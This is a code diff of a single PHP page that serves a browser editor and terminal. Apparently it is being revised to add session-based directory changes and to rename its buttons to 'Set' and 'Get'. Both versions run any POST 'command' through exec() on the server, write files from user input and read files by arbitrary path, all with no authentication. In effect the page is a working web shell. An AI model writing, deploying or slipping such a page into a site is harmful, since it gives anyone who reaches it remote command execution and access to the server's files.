@@ -1,37 +1,67 @@
 <?php
-if (isset($_POST['editor_content'], $_POST['file_name']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-    $file_name = preg_replace('/[^a-zA-Z0-9_.-]/', '_', $_POST['file_name']);
-    file_put_contents($file_name, $_POST['editor_content']);
-    echo "File saved:." . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8');
-    exit;
+session_start();
+
+if (!isset($_SESSION['current_dir'])) {
+    $_SESSION['current_dir'] = getcwd();
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
-    $command = escapeshellcmd($_POST['command']);
-    $output = [];
-    $returnValue = null;
-    exec($command . ' 2>&1', $output, $returnValue);
-
-    if ($returnValue === 0) {
-        echo implode("\n", $output) . "\n";
-    } else if (empty($output)) {
-        echo "Command failed to execute and produced no output.\n";
-    } else {
-        echo "Error: " . implode("\n", $output) . "\n";
-    }
-    exit;
+function is_binary($file) {
+    $file_content = file_get_contents($file, false, null, 0, 512);
+    return (bool) preg_match('~[^\x20-\x7E\t\r\n]~', $file_content);
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loadFile'])) {
-    $fileName = $_POST['loadFile'];
-    if (file_exists($fileName) && is_readable($fileName)) {
-        echo file_get_contents($fileName);
-    } else {
-        echo "Error: Cannot open the file. Please check the file name and try again.";
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['editor_content'], $_POST['file_name']) && isset($_POST['save_file'])) {
+        $file_name = preg_replace('/[^a-zA-Z0-9_.-]/', '_', $_POST['file_name']);
+        file_put_contents($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $file_name, $_POST['editor_content']);
+        echo "File saved: " . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8');
+        exit;
     }
-    exit;
+
+    if (isset($_POST['command'])) {
+        $command = $_POST['command'];
+        if (preg_match('/^cd\s+(.+)$/', $command, $matches)) {
+            $new_dir = $matches[1];
+            if (chdir($new_dir)) {
+                $_SESSION['current_dir'] = getcwd();
+                echo "Directory changed to: " . $_SESSION['current_dir'];
+            } else {
+                echo "Failed to change directory.";
+            }
+        } else {
+            $output = [];
+            $returnValue = null;
+            chdir($_SESSION['current_dir']);
+            exec(escapeshellcmd($command) . ' 2>&1', $output, $returnValue);
+
+            if ($returnValue === 0) {
+                echo implode("\n", $output) . "\n";
+            } else if (empty($output)) {
+                echo "Command failed to execute and produced no output.\n";
+            } else {
+                echo "Error: " . implode("\n", $output) . "\n";
+            }
+        }
+        exit;
+    }
+
+    if (isset($_POST['loadFile'])) {
+        $fileName = $_POST['loadFile'];
+        $filePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;
+        if (file_exists($filePath) && is_readable($filePath)) {
+            if (is_binary($filePath)) {
+                echo "Error: Cannot display binary file content.";
+            } else {
+                echo file_get_contents($filePath);
+            }
+        } else {
+            echo "Error: Cannot open the file. Please check the file name and try again.";
+        }
+        exit;
+    }
 }
 ?>
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -64,118 +94,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loadFile'])) {
             color: lime;
             padding: 10px;
             box-sizing: border-box;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
             overflow-y: auto;
         }
         #terminal-input {
-            width: 95%;
-            border: none;
-            background-color: #5c5c5c;
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #2e2e2e;
+            background-color: #2e2e2e;
             color: lime;
-            margin-top: 5px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
-        }
-        pre {
-            white-space: pre-wrap; /* CSS 3 */
-            white-space: -moz-pre-wrap;
         }
     </style>
 </head>
 <body>
-
 <div id="file-operations">
-    <label for="file-name"></label><input type="text" id="file-name">
-    <button id="save-button">Save</button>
-    <button id="load-button">Load</button>
-    <button id="download-button">Download</button>
-<!--    todo <button id="upload-button">Upload</button>-->
-    <label id="file-condition"></label>
+    <input type="text" id="file-name" placeholder="Enter file name">
+    <button id="set-button">Set</button>
+    <button id="get-button">Get</button>
 </div>
-
-<label for="editor"></label><textarea id="editor" placeholder="Enter the code here..."></textarea>
+<textarea id="editor" placeholder="Type your code here..."></textarea>
 <div id="terminal">
     <div id="terminal-output"></div>
-    <label for="terminal-input">$ </label><input type="text" id="terminal-input" autofocus>
+    <input type="text" id="terminal-input" placeholder="Enter command">
 </div>
-
 <script>
-    let isFileSaved = false; // ファイルが保存されたかどうかのフラグ
-    const editor = document.getElementById('editor');
-    editor.addEventListener('keydown', function(e) {
-        if (e.key === 'Tab') {
-            e.preventDefault(); // デフォルトのTabキーの動作をキャンセル
-            let start = this.selectionStart;
-            let end = this.selectionEnd;
-
-
-            const tab = '  ';
-            this.value = this.value.substring(0, start) + tab + this.value.substring(end);
-
-            this.selectionStart = this.selectionEnd = start + tab.length;
-        }
-    });
-
-    document.addEventListener('DOMContentLoaded', function() {
-        document.getElementById('load-button').addEventListener('click', function() {
-            const fileName = document.getElementById('file-name').value;
-            if (fileName) {
-                fetch('<?php echo $_SERVER["PHP_SELF"]; ?>', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: 'loadFile=' + encodeURIComponent(fileName)
-                })
-                    .then(response => response.text())
-                    .then(data => {
-                        if (data.startsWith('Error')) {
-                            alert(data);
-                        } else {
-                            document.getElementById('editor').value = data;
-                            isFileSaved = true;
-                        }
-                    })
-                    .catch(error => {
-                        alert('Error: ' + error.message);
-                    });
-            } else {
-                alert('Please enter a file name.');
-            }
-        });
-    });
-
-    // 保存ボタンのイベントハンドラ
-    document.getElementById('save-button').addEventListener('click', function() {
-        const fileName = document.getElementById('file-name').value;
-        const editorContent = document.getElementById('editor').value;
-        // ファイル名とエディタの内容をサーバーに送信
-        fetch('', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: 'file_name=' + encodeURIComponent(fileName) + '&editor_content=' + encodeURIComponent(editorContent)
-        })
-            .then(response => response.text())
-            .then((response) => {
-                // コンディションラベルにファイル名を表示
-                document.getElementById('file-condition').textContent = fileName;
-                isFileSaved = true; // ファイルが保存されたというフラグを立てる
-            });
-    });
-
-    // エディタの内容が変更されたらコンディションラベルを更新
-    document.getElementById('editor').addEventListener('input', function() {
-        if (isFileSaved) {
-            // 一度保存された後に編集が行われた場合、ラベルに * を追加
-            document.getElementById('file-condition').textContent = document.getElementById('file-name').value + '*';
-        }
-    });
-
     const input = document.getElementById('terminal-input');
     const outputDiv = document.getElementById('terminal-output');
 
@@ -194,7 +136,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loadFile'])) {
                     },
                     body: 'command=' + encodeURIComponent(command)
                 })
-                    // terminal-outputへの出力部分
                     .then(response => response.text())
                     .then((text) => {
                         let pre = document.createElement('pre');
@@ -209,23 +150,59 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loadFile'])) {
         }
     });
 
-    function download(filename, text) {
-        let element = document.createElement('a');
-        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
-        element.setAttribute('download', filename);
-
-        element.style.display = 'none';
-        document.body.appendChild(element);
-
-        element.click();
-
-        document.body.removeChild(element);
-    }
-
-    document.getElementById('download-button').addEventListener('click', function() {
+    document.getElementById('set-button').addEventListener('click', function() {
         const filename = document.getElementById('file-name').value;
-        const text = document.getElementById('editor').value;
-        download(filename, text);
+        const content = document.getElementById('editor').value;
+
+        fetch('', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'file_name=' + encodeURIComponent(filename) + '&editor_content=' + encodeURIComponent(content) + '&save_file=1'
+        })
+            .then(response => response.text())
+            .then((text) => {
+                let pre = document.createElement('pre');
+                pre.textContent = text;
+                outputDiv.appendChild(pre);
+                outputDiv.scrollTop = outputDiv.scrollHeight;
+            })
+            .catch((error) => {
+                outputDiv.innerHTML += "Error: " + error.message;
+            });
+    });
+
+    document.getElementById('get-button').addEventListener('click', function() {
+        const filename = document.getElementById('file-name').value;
+
+        fetch('', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'loadFile=' + encodeURIComponent(filename)
+        })
+            .then(response => response.text())
+            .then((text) => {
+                let pre = document.createElement('pre');
+                if (text.startsWith('Error:')) {
+                    pre.textContent = text;
+                    outputDiv.appendChild(pre);
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                } else {
+                    document.getElementById('editor').value = text;
+                    pre.textContent = "File loaded successfully.";
+                    outputDiv.appendChild(pre);
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                }
+            })
+            .catch((error) => {
+                let pre = document.createElement('pre');
+                pre.textContent = "Error: " + error.message;
+                outputDiv.appendChild(pre);
+                outputDiv.scrollTop = outputDiv.scrollHeight;
+            });
     });
 </script>
 </body>
